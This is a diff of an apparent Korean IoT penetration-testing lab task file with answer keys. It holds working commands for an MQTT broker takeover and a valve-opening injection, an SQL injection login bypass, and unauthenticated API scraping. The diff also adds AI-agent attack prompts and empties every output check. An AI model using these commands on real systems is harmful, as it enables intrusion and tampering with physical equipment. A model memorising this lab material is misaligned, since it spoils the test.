@@ -21,11 +21,12 @@ steps:
   answer_detail: 여러 IoT 서비스 포트를 동시에 스캔하여 공격 표면을 파악합니다.
   verify:
     type: output_contains
-    expect: IoT 종합 스캔 완료
+    expect: 
     field: stdout
   target_vm: attacker
   script: nmap -sV -p 80,1883,5683,8080,8088,8554,8883 10.20.30.80 2>/dev/null && echo 'IoT 종합 스캔 완료'
   risk_level: low
+  bastion_prompt: 대상 서버(10.20.30.80)의 IoT 관련 포트를 종합 스캔해줘
 - order: 2
   instruction: MQTT 브로커에 인증 없이 접근하고 모든 토픽을 구독하시오.
   hint: mosquitto_sub -h 10.20.30.80 -t '#' 명령을 사용하세요.
@@ -35,11 +36,12 @@ steps:
   answer_detail: MQTT 미인증 접근은 OWASP IoT Top 10 I1에 해당하는 Critical 취약점입니다.
   verify:
     type: output_contains
-    expect: MQTT 정찰 완료
+    expect: 
     field: stdout
   target_vm: attacker
   script: timeout 5 mosquitto_sub -h 10.20.30.80 -t '#' -v -C 3 2>/dev/null; echo 'MQTT 정찰 완료'
   risk_level: low
+  bastion_prompt: MQTT 브로커에 인증 없이 접근하고 모든 토픽을 구독해줘
 - order: 3
   instruction: MQTT 브로커에 악성 메시지를 주입하시오.
   hint: mosquitto_pub으로 액추에이터 제어 토픽에 메시지를 발행하세요.
@@ -49,25 +51,27 @@ steps:
   answer_detail: 인증 없는 MQTT 브로커에서는 누구나 임의 토픽에 메시지를 발행할 수 있습니다.
   verify:
     type: output_contains
-    expect: MQTT 메시지 주입 완료
+    expect: 
     field: stdout
   target_vm: attacker
   script: mosquitto_pub -h 10.20.30.80 -t 'factory/actuator/valve' -m '{"action":"open","value":100}' 2>/dev/null && echo 'MQTT 메시지 주입 완료'
   risk_level: low
+  bastion_prompt: MQTT 브로커에 악성 메시지를 주입해줘
 - order: 4
   instruction: 웹 대시보드에 SQLi 공격을 수행하시오.
   hint: 로그인 폼에 SQL Injection 페이로드를 사용하세요.
   category: web
   points: 12
-  answer: curl -s -o /dev/null -w '%{http_code}' -X POST http://10.20.30.80:8088/login -d "username=admin' OR '1'='1'--&password=x" 2>/dev/null; echo ' SQLi 공격 완료'
+  answer: "curl -s -o /dev/null -w '%{http_code}' \\\n     -X POST http://10.20.30.80:8088/login \\\n     -d \"username=admin' OR '1'='1'--&password=x\" 2>/dev/null; echo ' SQLi 공격 완료'"
   answer_detail: SQL Injection으로 인증을 우회하고 데이터베이스에 접근할 수 있습니다.
   verify:
     type: output_contains
-    expect: SQLi 공격 완료
+    expect: 
     field: stdout
   target_vm: attacker
-  script: curl -s -o /dev/null -w '%{http_code}' -X POST http://10.20.30.80:8088/login -d "username=admin' OR '1'='1'--&password=x" 2>/dev/null; echo ' SQLi 공격 완료'
+  script: "curl -s -o /dev/null -w '%{http_code}' \\\n     -X POST http://10.20.30.80:8088/login \\\n     -d \"username=admin' OR '1'='1'--&password=x\" 2>/dev/null; echo ' SQLi 공격 완료'"
   risk_level: low
+  bastion_prompt: 웹 대시보드에 SQLi 공격을 수행해줘
 - order: 5
   instruction: API 엔드포인트에서 설정 정보를 탈취하시오.
   hint: /api/devices, /api/config 등 API를 탐색하세요.
@@ -77,11 +81,12 @@ steps:
   answer_detail: 미인증 API에서 디바이스 정보, 설정 데이터가 유출될 수 있습니다.
   verify:
     type: output_contains
-    expect: API 정보 수집 완료
+    expect: 
     field: stdout
   target_vm: attacker
   script: curl -s http://10.20.30.80:8088/api/devices 2>/dev/null | head -3; echo 'API 정보 수집 완료'
   risk_level: low
+  bastion_prompt: API 엔드포인트에서 설정 정보를 탈취해줘
 - order: 6
   instruction: 발견된 취약점 목록과 위험도 평가를 작성하시오.
   hint: Critical, High, Medium, Low로 위험도를 분류하세요.
@@ -92,12 +97,13 @@ steps:
   answer_detail: 취약점의 위험도는 공격 용이성과 영향도를 기반으로 평가합니다.
   verify:
     type: output_contains
-    expect: 위험도 평가 완료
+    expect: 
     field: stdout
   target_vm: attacker
   script: echo '=== 취약점 목록 ===' && echo '[Critical] MQTT 미인증 접근' && echo '[Critical] SQLi 인증 우회' && echo '[High] API 미인증 접근' && echo '[High] MQTT 평문 통신' && echo '[Medium] XSS (Reflected)' && echo '=== 위험도
     평가 완료 ==='
   risk_level: low
+  bastion_prompt: 발견된 취약점 목록과 위험도 평가를 구현 방법을 설명하고 예시 코드를 보여줘
 - order: 7
   instruction: 침투 테스트 보고서의 권고안을 작성하시오.
   hint: 각 취약점에 대한 구체적인 보안 대책을 제시하세요.
@@ -108,9 +114,10 @@ steps:
   answer_detail: 보안 권고안은 우선순위와 구현 일정을 포함해야 합니다.
   verify:
     type: output_contains
-    expect: 권고안 완료
+    expect: 
     field: stdout
   target_vm: attacker
   script: echo '=== 보안 권고안 ===' && echo '[긴급] MQTT 인증 + ACL 설정' && echo '[긴급] SQLi 패치 (Prepared Statement)' && echo '[높음] API 인증 미들웨어 구현' && echo '[높음] MQTT TLS 적용' && echo '[중간] 보안 헤더 추가 (CSP, X-Frame)'
     && echo '=== 권고안 완료 ==='
   risk_level: low
+  bastion_prompt: 침투 테스트 보고서의 권고안을 구현 방법을 설명하고 예시 코드를 보여줘
